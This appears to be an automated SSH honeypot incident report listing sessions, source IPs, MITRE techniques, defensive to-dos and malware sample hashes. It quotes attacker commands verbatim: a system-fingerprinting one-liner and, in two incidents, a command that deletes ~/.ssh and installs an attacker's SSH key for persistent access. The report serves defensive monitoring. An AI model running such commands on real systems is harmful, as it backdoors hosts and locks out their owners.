### 🔴 HIGH · IR-d0e057eb7e70

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-06-30 18:42 |
| **Last Seen** | 2026-06-30 18:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:42:43` | `cowrie.session.connect` |
| `2026-06-30 18:42:43` | `cowrie.client.version` |
| `2026-06-30 18:42:43` | `cowrie.client.kex` |
| `2026-06-30 18:42:45` | `cowrie.login.success` |
| `2026-06-30 18:42:46` | `cowrie.session.params` |
| `2026-06-30 18:42:46` | `cowrie.command.input` |
| `2026-06-30 18:42:46` | `cowrie.command.input` |
| `2026-06-30 18:42:46` | `cowrie.command.input` |
| `2026-06-30 18:42:46` | `cowrie.command.input` |
| `2026-06-30 18:42:46` | `cowrie.command.input` |
| `2026-06-30 18:42:46` | `cowrie.command.success` |
| `2026-06-30 18:42:46` | `cowrie.command.input` |
| `2026-06-30 18:42:46` | `cowrie.command.input` |
| `2026-06-30 18:42:46` | `cowrie.command.input` |
| `2026-06-30 18:42:46` | `cowrie.command.input` |
| `2026-06-30 18:42:46` | `cowrie.log.closed` |
| `2026-06-30 18:42:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-140c83e18bfe

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-06-30 18:45 |
| **Last Seen** | 2026-06-30 18:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:45:01` | `cowrie.session.connect` |
| `2026-06-30 18:45:01` | `cowrie.client.version` |
| `2026-06-30 18:45:01` | `cowrie.client.kex` |
| `2026-06-30 18:45:02` | `cowrie.login.success` |
| `2026-06-30 18:45:03` | `cowrie.session.params` |
| `2026-06-30 18:45:03` | `cowrie.command.input` |
| `2026-06-30 18:45:03` | `cowrie.command.input` |
| `2026-06-30 18:45:03` | `cowrie.command.input` |
| `2026-06-30 18:45:03` | `cowrie.command.input` |
| `2026-06-30 18:45:03` | `cowrie.command.input` |
| `2026-06-30 18:45:03` | `cowrie.command.success` |
| `2026-06-30 18:45:03` | `cowrie.command.input` |
| `2026-06-30 18:45:03` | `cowrie.command.input` |
| `2026-06-30 18:45:03` | `cowrie.command.input` |
| `2026-06-30 18:45:03` | `cowrie.command.input` |
| `2026-06-30 18:45:03` | `cowrie.log.closed` |
| `2026-06-30 18:45:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0a243371557

| Field | Detail |
|---|---|
| **Source IP** | `222.232.176[.]7` |
| **First Seen** | 2026-06-30 18:45 |
| **Last Seen** | 2026-06-30 18:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:45:16` | `cowrie.session.connect` |
| `2026-06-30 18:45:16` | `cowrie.client.version` |
| `2026-06-30 18:45:17` | `cowrie.client.kex` |
| `2026-06-30 18:45:17` | `cowrie.login.success` |
| `2026-06-30 18:45:18` | `cowrie.session.params` |
| `2026-06-30 18:45:18` | `cowrie.command.input` |
| `2026-06-30 18:45:18` | `cowrie.command.failed` |
| `2026-06-30 18:45:19` | `cowrie.log.closed` |
| `2026-06-30 18:45:20` | `cowrie.session.params` |
| `2026-06-30 18:45:20` | `cowrie.command.input` |
| `2026-06-30 18:45:20` | `cowrie.session.file_download` |
| `2026-06-30 18:45:20` | `cowrie.log.closed` |
| `2026-06-30 18:45:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.232.176[.]7` to AbuseIPDB if not already reported
- [ ] Block `222.232.176[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec3049f426e4

| Field | Detail |
|---|---|
| **Source IP** | `222.232.176[.]7` |
| **First Seen** | 2026-06-30 18:45 |
| **Last Seen** | 2026-06-30 18:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:45:20` | `cowrie.session.connect` |
| `2026-06-30 18:45:20` | `cowrie.client.version` |
| `2026-06-30 18:45:20` | `cowrie.client.kex` |
| `2026-06-30 18:45:21` | `cowrie.login.success` |
| `2026-06-30 18:45:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.232.176[.]7` to AbuseIPDB if not already reported
- [ ] Block `222.232.176[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c57401e61f6f

| Field | Detail |
|---|---|
| **Source IP** | `222.232.176[.]7` |
| **First Seen** | 2026-06-30 18:45 |
| **Last Seen** | 2026-06-30 18:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:45:21` | `cowrie.session.connect` |
| `2026-06-30 18:45:21` | `cowrie.client.version` |
| `2026-06-30 18:45:22` | `cowrie.client.kex` |
| `2026-06-30 18:45:22` | `cowrie.login.success` |
| `2026-06-30 18:45:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.232.176[.]7` to AbuseIPDB if not already reported
- [ ] Block `222.232.176[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-359a767c1b61

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-06-30 18:47 |
| **Last Seen** | 2026-06-30 18:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:47:26` | `cowrie.session.connect` |
| `2026-06-30 18:47:26` | `cowrie.client.version` |
| `2026-06-30 18:47:26` | `cowrie.client.kex` |
| `2026-06-30 18:47:27` | `cowrie.login.success` |
| `2026-06-30 18:47:28` | `cowrie.session.params` |
| `2026-06-30 18:47:28` | `cowrie.command.input` |
| `2026-06-30 18:47:28` | `cowrie.command.input` |
| `2026-06-30 18:47:28` | `cowrie.command.input` |
| `2026-06-30 18:47:28` | `cowrie.command.input` |
| `2026-06-30 18:47:28` | `cowrie.command.input` |
| `2026-06-30 18:47:28` | `cowrie.command.success` |
| `2026-06-30 18:47:28` | `cowrie.command.input` |
| `2026-06-30 18:47:28` | `cowrie.command.input` |
| `2026-06-30 18:47:28` | `cowrie.command.input` |
| `2026-06-30 18:47:28` | `cowrie.command.input` |
| `2026-06-30 18:47:28` | `cowrie.log.closed` |
| `2026-06-30 18:47:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ac64ba57c8b

| Field | Detail |
|---|---|
| **Source IP** | `91.211.95[.]158` |
| **First Seen** | 2026-06-30 18:48 |
| **Last Seen** | 2026-06-30 18:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:48:35` | `cowrie.session.connect` |
| `2026-06-30 18:48:35` | `cowrie.client.version` |
| `2026-06-30 18:48:36` | `cowrie.client.kex` |
| `2026-06-30 18:48:36` | `cowrie.login.success` |
| `2026-06-30 18:48:37` | `cowrie.session.params` |
| `2026-06-30 18:48:37` | `cowrie.command.input` |
| `2026-06-30 18:48:37` | `cowrie.command.failed` |
| `2026-06-30 18:48:37` | `cowrie.log.closed` |
| `2026-06-30 18:48:38` | `cowrie.session.params` |
| `2026-06-30 18:48:38` | `cowrie.command.input` |
| `2026-06-30 18:48:38` | `cowrie.session.file_download` |
| `2026-06-30 18:48:38` | `cowrie.log.closed` |
| `2026-06-30 18:48:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.211.95[.]158` to AbuseIPDB if not already reported
- [ ] Block `91.211.95[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e21e0bb73c4

| Field | Detail |
|---|---|
| **Source IP** | `91.211.95[.]158` |
| **First Seen** | 2026-06-30 18:48 |
| **Last Seen** | 2026-06-30 18:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:48:38` | `cowrie.session.connect` |
| `2026-06-30 18:48:38` | `cowrie.client.version` |
| `2026-06-30 18:48:38` | `cowrie.client.kex` |
| `2026-06-30 18:48:39` | `cowrie.login.success` |
| `2026-06-30 18:48:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.211.95[.]158` to AbuseIPDB if not already reported
- [ ] Block `91.211.95[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41f872a0b148

| Field | Detail |
|---|---|
| **Source IP** | `91.211.95[.]158` |
| **First Seen** | 2026-06-30 18:48 |
| **Last Seen** | 2026-06-30 18:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:48:39` | `cowrie.session.connect` |
| `2026-06-30 18:48:39` | `cowrie.client.version` |
| `2026-06-30 18:48:39` | `cowrie.client.kex` |
| `2026-06-30 18:48:40` | `cowrie.login.success` |
| `2026-06-30 18:48:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.211.95[.]158` to AbuseIPDB if not already reported
- [ ] Block `91.211.95[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0b4cd389be9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-06-30 18:49 |
| **Last Seen** | 2026-06-30 18:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:49:56` | `cowrie.session.connect` |
| `2026-06-30 18:49:56` | `cowrie.client.version` |
| `2026-06-30 18:49:56` | `cowrie.client.kex` |
| `2026-06-30 18:49:57` | `cowrie.login.success` |
| `2026-06-30 18:49:58` | `cowrie.session.params` |
| `2026-06-30 18:49:58` | `cowrie.command.input` |
| `2026-06-30 18:49:58` | `cowrie.command.input` |
| `2026-06-30 18:49:58` | `cowrie.command.input` |
| `2026-06-30 18:49:58` | `cowrie.command.input` |
| `2026-06-30 18:49:58` | `cowrie.command.input` |
| `2026-06-30 18:49:58` | `cowrie.command.success` |
| `2026-06-30 18:49:58` | `cowrie.command.input` |
| `2026-06-30 18:49:58` | `cowrie.command.input` |
| `2026-06-30 18:49:58` | `cowrie.command.input` |
| `2026-06-30 18:49:58` | `cowrie.command.input` |
| `2026-06-30 18:49:58` | `cowrie.log.closed` |
| `2026-06-30 18:49:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f916c903cffe

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-06-30 18:52 |
| **Last Seen** | 2026-06-30 18:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:52:47` | `cowrie.session.connect` |
| `2026-06-30 18:52:47` | `cowrie.client.version` |
| `2026-06-30 18:52:47` | `cowrie.client.kex` |
| `2026-06-30 18:52:48` | `cowrie.login.success` |
| `2026-06-30 18:52:48` | `cowrie.session.params` |
| `2026-06-30 18:52:48` | `cowrie.command.input` |
| `2026-06-30 18:52:48` | `cowrie.command.input` |
| `2026-06-30 18:52:48` | `cowrie.command.input` |
| `2026-06-30 18:52:48` | `cowrie.command.input` |
| `2026-06-30 18:52:48` | `cowrie.command.input` |
| `2026-06-30 18:52:48` | `cowrie.command.success` |
| `2026-06-30 18:52:48` | `cowrie.command.input` |
| `2026-06-30 18:52:48` | `cowrie.command.input` |
| `2026-06-30 18:52:48` | `cowrie.command.input` |
| `2026-06-30 18:52:48` | `cowrie.command.input` |
| `2026-06-30 18:52:49` | `cowrie.log.closed` |
| `2026-06-30 18:52:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2956dbc09473

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 18:54 |
| **Last Seen** | 2026-06-30 18:54 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:54:01` | `cowrie.session.connect` |
| `2026-06-30 18:54:03` | `cowrie.client.version` |
| `2026-06-30 18:54:03` | `cowrie.client.kex` |
| `2026-06-30 18:54:09` | `cowrie.login.success` |
| `2026-06-30 18:54:12` | `cowrie.session.params` |
| `2026-06-30 18:54:12` | `cowrie.command.input` |
| `2026-06-30 18:54:13` | `cowrie.log.closed` |
| `2026-06-30 18:54:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49fed7bac07a

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 18:54 |
| **Last Seen** | 2026-06-30 18:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 18:54:15` | `cowrie.session.connect` |
| `2026-06-30 18:54:16` | `cowrie.client.version` |
| `2026-06-30 18:54:16` | `cowrie.client.kex` |
| `2026-06-30 18:54:18` | `cowrie.login.success` |
| `2026-06-30 18:54:19` | `cowrie.session.params` |
| `2026-06-30 18:54:19` | `cowrie.command.input` |
| `2026-06-30 18:54:20` | `cowrie.log.closed` |
| `2026-06-30 18:54:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `210.16.100[.]120` | **7** | 2026-06-30 17:07 | 2026-06-30 18:26 | 6m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]227` | **2** | 2026-06-30 18:11 | 2026-06-30 18:28 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `199.45.155[.]74` | **2** | 2026-06-30 18:43 | 2026-06-30 18:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.65.192[.]71` | **2** | 2026-06-30 17:47 | 2026-06-30 17:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]204` | **2** | 2026-06-30 17:56 | 2026-06-30 17:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | **2** | 2026-06-30 17:21 | 2026-06-30 17:31 | 1m | 0 | `T1592` | 🟢 LOW |
| `114.33.12[.]13` | 1 | 2026-06-30 18:00 | 2026-06-30 18:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `117.89.249[.]222` | 1 | 2026-06-30 17:36 | 2026-06-30 17:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.131[.]27` | 1 | 2026-06-30 17:45 | 2026-06-30 17:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.45[.]182` | 1 | 2026-06-30 17:11 | 2026-06-30 17:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]14` | 1 | 2026-06-30 17:37 | 2026-06-30 17:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]136` | 1 | 2026-06-30 17:37 | 2026-06-30 17:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.80[.]24` | 1 | 2026-06-30 17:38 | 2026-06-30 17:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.84[.]145` | 1 | 2026-06-30 17:39 | 2026-06-30 17:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `194.195.210[.]47` | 1 | 2026-06-30 18:34 | 2026-06-30 18:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]81` | 1 | 2026-06-30 18:03 | 2026-06-30 18:04 | 59s | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]155` | 1 | 2026-06-30 17:34 | 2026-06-30 17:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-06-30 16:58 | 2026-06-30 16:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.138.168[.]46` | 1 | 2026-06-30 18:22 | 2026-06-30 18:24 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
